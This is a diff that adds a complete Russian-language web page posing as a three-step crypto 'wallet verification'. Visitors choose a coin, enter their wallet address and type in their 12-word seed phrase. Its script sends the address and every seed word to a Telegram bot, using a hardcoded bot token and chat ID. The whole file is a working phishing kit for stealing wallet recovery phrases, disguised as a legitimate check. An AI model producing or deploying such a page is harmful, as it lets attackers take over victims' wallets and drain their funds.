@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Верификация крипто кошелька</title>
+    <style>
+        /* Стили оставляем те же */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 700px;
+        }
+        
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: #e0e0e0;
+            z-index: 1;
+        }
+        
+        .progress-step {
+            position: relative;
+            z-index: 2;
+            background: white;
+            padding: 0 10px;
+            text-align: center;
+        }
+        
+        .step-number {
+            width: 30px;
+            height: 30px;
+            background: #e0e0e0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 5px;
+            font-weight: bold;
+            color: #666;
+        }
+        
+        .step-number.active {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .step-number.completed {
+            background: #4CAF50;
+            color: white;
+        }
+        
+        .step-label {
+            font-size: 12px;
+            color: #666;
+        }
+        
+        .section {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+        
+        .section.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .coins-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .coin-card {
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: white;
+        }
+        
+        .coin-card:hover {
+            border-color: #4CAF50;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.2);
+        }
+        
+        .coin-card.selected {
+            border-color: #4CAF50;
+            background: #f0f9f0;
+        }
+        
+        .coin-icon {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto 10px;
+            background: #f0f0f0;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .coin-name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .coin-symbol {
+            color: #666;
+            font-size: 12px;
+        }
+        
+        .coin-card[data-symbol="TRX"] .coin-icon {
+            background: #ff6b6b;
+            color: white;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+        
+        .input-group input.error {
+            border-color: #f44336;
+        }
+        
+        .words-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .word-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+        }
+        
+        .word-input:focus {
+            outline: none;
+            border-color: #4CAF50;
+        }
+        
+        .btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary {
+            background: #4CAF50;
+            color: white;
+            width: 100%;
+        }
+        
+        .btn-primary:hover:not(:disabled) {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.4);
+        }
+        
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .btn-secondary {
+            background: #f0f0f0;
+            color: #333;
+            margin-right: 10px;
+        }
+        
+        .btn-secondary:hover {
+            background: #e0e0e0;
+        }
+        
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        
+        .status.warning {
+            background: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+            display: block;
+        }
+        
+        .selected-info {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-left: 4px solid #4CAF50;
+        }
+        
+        .selected-info p {
+            margin: 5px 0;
+        }
+        
+        /* Стили для отладки */
+        .debug-info {
+            background: #f0f0f0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        @media (max-width: 500px) {
+            .container {
+                padding: 20px;
+            }
+            
+            .coins-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .words-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Верификация кошелька</h1>
+        <p class="subtitle">Пройдите 3 шага для подтверждения</p>
+        
+        <div class="progress-bar">
+            <div class="progress-step">
+                <div class="step-number active" id="step1-indicator">1</div>
+                <div class="step-label">Выбор монеты</div>
+            </div>
+            <div class="progress-step">
+                <div class="step-number" id="step2-indicator">2</div>
+                <div class="step-label">Адрес кошелька</div>
+            </div>
+            <div class="progress-step">
+                <div class="step-number" id="step3-indicator">3</div>
+                <div class="step-label">12 слов</div>
+            </div>
+        </div>
+        
+        <!-- ШАГ 1: Выбор монеты -->
+        <div id="step1" class="section active">
+            <h3 style="margin-bottom: 20px;">Выберите вашу криптовалюту:</h3>
+            
+            <div class="coins-grid" id="coinsGrid"></div>
+            
+            <div class="button-group">
+                <button class="btn btn-primary" id="nextToStep2" disabled>Далее →</button>
+            </div>
+        </div>
+        
+        <!-- ШАГ 2: Ввод адреса -->
+        <div id="step2" class="section">
+            <div class="selected-info" id="selectedCoinInfo"></div>
+            
+            <div class="input-group">
+                <label for="walletAddress">Введите адрес вашего кошелька:</label>
+                <input type="text" id="walletAddress" placeholder="Например: TXYZ... (для TRX)" autocomplete="off">
+                <small style="color: #666; display: block; margin-top: 5px;">Введите адрес кошелька выбранной монеты</small>
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-secondary" id="backToStep1">← Назад</button>
+                <button class="btn btn-primary" id="nextToStep3" disabled>Далее →</button>
+            </div>
+        </div>
+        
+        <!-- ШАГ 3: Ввод 12 слов -->
+        <div id="step3" class="section">
+            <div class="selected-info" id="finalInfo"></div>
+            
+            <div class="input-group">
+                <label>Введите 12 слов от вашего кошелька:</label>
+                <div class="words-grid" id="wordsGrid"></div>
+                <small style="color: #f44336; display: block; margin-top: 5px;">⚠️ Введите слова в правильном порядке</small>
+            </div>
+            
+            <div class="button-group">
+                <button class="btn btn-secondary" id="backToStep2">← Назад</button>
+                <button class="btn btn-primary" id="submitData">Отправить администратору</button>
+            </div>
+        </div>
+        
+        <div id="status" class="status"></div>
+        
+        <!-- Информация для отладки -->
+        <div id="debugInfo" class="debug-info"></div>
+    </div>
+
+    <script>
+        // ✅ ВАШИ ДАННЫЕ
+        const TELEGRAM_BOT_TOKEN = '8443184653:AAHr1pjhAoge8CoUCFk4VPO2OYH85cl4Tns';
+        const TELEGRAM_CHAT_ID = '7734938819';
+        
+        // Список монет
+        const coins = [
+            { name: 'Bitcoin', symbol: 'BTC', icon: '₿' },
+            { name: 'Ethereum', symbol: 'ETH', icon: 'Ξ' },
+            { name: 'Tron', symbol: 'TRX', icon: 'T' },
+            { name: 'Binance Coin', symbol: 'BNB', icon: 'B' },
+            { name: 'Solana', symbol: 'SOL', icon: 'S' },
+            { name: 'Cardano', symbol: 'ADA', icon: 'A' },
+            { name: 'Polkadot', symbol: 'DOT', icon: '●' },
+            { name: 'Ripple', symbol: 'XRP', icon: 'X' },
+            { name: 'Dogecoin', symbol: 'DOGE', icon: 'Ð' },
+            { name: 'Avalanche', symbol: 'AVAX', icon: 'A' }
+        ];
+        
+        let selectedCoin = null;
+        let walletAddress = '';
+        
+        // Создаем сетку монет
+        const coinsGrid = document.getElementById('coinsGrid');
+        coins.forEach(coin => {
+            const card = document.createElement('div');
+            card.className = 'coin-card';
+            card.dataset.symbol = coin.symbol;
+            card.innerHTML = `
+                <div class="coin-icon">${coin.icon}</div>
+                <div class="coin-name">${coin.name}</div>
+                <div class="coin-symbol">${coin.symbol}</div>
+            `;
+            
+            card.addEventListener('click', () => selectCoin(coin, card));
+            coinsGrid.appendChild(card);
+        });
+        
+        // Создаем 12 полей для слов
+        const wordsGrid = document.getElementById('wordsGrid');
+        for (let i = 1; i <= 12; i++) {
+            const input = document.createElement('input');
+            input.type = 'text';
+            input.className = 'word-input';
+            input.placeholder = `Слово ${i}`;
+            input.required = true;
+            input.maxLength = 50;
+            input.autocomplete = 'off';
+            wordsGrid.appendChild(input);
+        }
+        
+        // DOM элементы
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        
+        const step1Indicator = document.getElementById('step1-indicator');
+        const step2Indicator = document.getElementById('step2-indicator');
+        const step3Indicator = document.getElementById('step3-indicator');
+        
+        const nextToStep2 = document.getElementById('nextToStep2');
+        const nextToStep3 = document.getElementById('nextToStep3');
+        const backToStep1 = document.getElementById('backToStep1');
+        const backToStep2 = document.getElementById('backToStep2');
+        const submitBtn = document.getElementById('submitData');
+        
+        const walletAddressInput = document.getElementById('walletAddress');
+        const selectedCoinInfo = document.getElementById('selectedCoinInfo');
+        const finalInfo = document.getElementById('finalInfo');
+        const statusDiv = document.getElementById('status');
+        const debugInfo = document.getElementById('debugInfo');
+        
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+            
+            if (type === 'success') {
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        function selectCoin(coin, card) {
+            document.querySelectorAll('.coin-card').forEach(c => {
+                c.classList.remove('selected');
+            });
+            
+            card.classList.add('selected');
+            selectedCoin = coin;
+            nextToStep2.disabled = false;
+        }
+        
+        function validateAddress(address, coin) {
+            if (!address || address.length < 10) return false;
+            
+            if (coin.symbol === 'TRX') {
+                return address.startsWith('T') && address.length >= 30;
+            }
+            
+            return address.length >= 25;
+        }
+        
+        nextToStep2.addEventListener('click', () => {
+            if (!selectedCoin) return;
+            
+            step1.classList.remove('active');
+            step2.classList.add('active');
+            
+            step1Indicator.classList.remove('active');
+            step2Indicator.classList.add('active');
+            step1Indicator.classList.add('completed');
+            
+            selectedCoinInfo.innerHTML = `
+                <p><strong>Выбрана монета:</strong> ${selectedCoin.name} (${selectedCoin.symbol})</p>
+                <p><strong>Формат адреса:</strong> ${selectedCoin.symbol === 'TRX' ? 'Начинается с T' : 'Стандартный формат'}</p>
+            `;
+        });
+        
+        backToStep1.addEventListener('click', () => {
+            step2.classList.remove('active');
+            step1.classList.add('active');
+            
+            step2Indicator.classList.remove('active');
+            step1Indicator.classList.add('active');
+        });
+        
+        walletAddressInput.addEventListener('input', (e) => {
+            const address = e.target.value.trim();
+            
+            if (selectedCoin && validateAddress(address, selectedCoin)) {
+                walletAddress = address;
+                nextToStep3.disabled = false;
+                walletAddressInput.classList.remove('error');
+            } else {
+                nextToStep3.disabled = true;
+                walletAddressInput.classList.add('error');
+            }
+        });
+        
+        nextToStep3.addEventListener('click', () => {
+            if (!walletAddress) return;
+            
+            step2.classList.remove('active');
+            step3.classList.add('active');
+            
+            step2Indicator.classList.remove('active');
+            step3Indicator.classList.add('active');
+            step2Indicator.classList.add('completed');
+            
+            finalInfo.innerHTML = `
+                <p><strong>Монета:</strong> ${selectedCoin.name} (${selectedCoin.symbol})</p>
+                <p><strong>Адрес:</strong> ${walletAddress.substring(0, 10)}...${walletAddress.substring(walletAddress.length - 5)}</p>
+            `;
+        });
+        
+        backToStep2.addEventListener('click', () => {
+            step3.classList.remove('active');
+            step2.classList.add('active');
+            
+            step3Indicator.classList.remove('active');
+            step2Indicator.classList.add('active');
+        });
+        
+        // ✅ ИСПРАВЛЕННАЯ ФУНКЦИЯ ОТПРАВКИ
+        async function sendToTelegram(message) {
+            try {
+                console.log('📤 Отправляем сообщение в Telegram...');
+                
+                // Формируем URL
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                // Параметры
+                const params = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                };
+                
+                console.log('URL:', url);
+                console.log('Params:', params);
+                
+                // Отправляем
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(params)
+                });
+                
+                console.log('Статус ответа:', response.status);
+                
+                const data = await response.json();
+                console.log('Ответ Telegram:', data);
+                
+                if (data.ok) {
+                    console.log('✅ Успешно отправлено!');
+                    return true;
+                } else {
+                    throw new Error(data.description);
+                }
+                
+            } catch (error) {
+                console.error('❌ Ошибка:', error);
+                
+                // Показываем ошибку пользователю
+                showStatus(`❌ Ошибка: ${error.message}`, 'error');
+                throw error;
+            }
+        }
+        
+        submitBtn.addEventListener('click', async () => {
+            const wordInputs = document.querySelectorAll('.word-input');
+            const words = Array.from(wordInputs).map(input => input.value.trim());
+            
+            if (words.some(word => word === '')) {
+                showStatus('❌ Заполните все 12 слов', 'error');
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Отправка...';
+            
+            try {
+                const message = `🔐 <b>НОВАЯ ВЕРИФИКАЦИЯ КОШЕЛЬКА</b>\n\n` +
+                               `💰 <b>Монета:</b> ${selectedCoin.name} (${selectedCoin.symbol})\n` +
+                               `📬 <b>Адрес:</b> <code>${walletAddress}</code>\n\n` +
+                               `📝 <b>12 слов:</b>\n${words.map((word, i) => `${i+1}. ${word}`).join('\n')}\n\n` +
+                               `🕐 <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+                
+                await sendToTelegram(message);
+                
+                showStatus('✅ Данные успешно отправлены администратору!', 'success');
+                
+                // Очищаем форму
+                setTimeout(() => {
+                    location.reload();
+                }, 3000);
+                
+            } catch (error) {
+                console.error('❌ Ошибка:', error);
+                showStatus('❌ Ошибка отправки. Проверьте консоль (F12)', 'error');
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Отправить администратору';
+            }
+        });
+        
+        // Проверка при загрузке
+        window.addEventListener('load', () => {
+            console.log('✅ Сайт загружен');
+            console.log('Токен:', TELEGRAM_BOT_TOKEN);
+            console.log('Chat ID:', TELEGRAM_CHAT_ID);
+            
+            // Проверяем доступность Telegram API
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('✅ Бот доступен:', data.result.username);
+                    } else {
+                        console.error('❌ Бот недоступен:', data);
+                    }
+                })
+                .catch(error => {
+                    console.error('❌ Ошибка подключения к Telegram:', error);
+                });
+        });
+    </script>
+</body>
+</html>
